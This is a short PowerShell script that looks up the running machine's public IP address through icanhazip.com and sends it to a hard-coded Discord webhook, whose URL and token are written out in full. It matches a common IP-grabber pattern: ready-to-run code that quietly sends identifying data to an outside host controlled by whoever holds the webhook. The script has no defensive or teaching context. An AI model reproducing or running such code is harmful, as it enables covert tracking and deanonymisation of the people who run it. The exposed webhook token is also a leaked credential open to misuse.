# Get IP address
$ip = (Invoke-WebRequest -Uri "http://icanhazip.com").Content.Trim()

# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1326164102430724161/wA73oSHytoHTie7FnbZCz4tetoE-AJkvemVg_JqZfrSObQHJfTFBnOA_4XRbIenjYUxi"

# Send IP address to Discord Webhook
$headers = @{
    "Content-Type" = "application/json"
}
$body = @{
    "content" = "IP Address: $ip"
} | ConvertTo-Json
Invoke-WebRequest -Uri $webhookUrl -Method POST -Headers $headers -Body $body
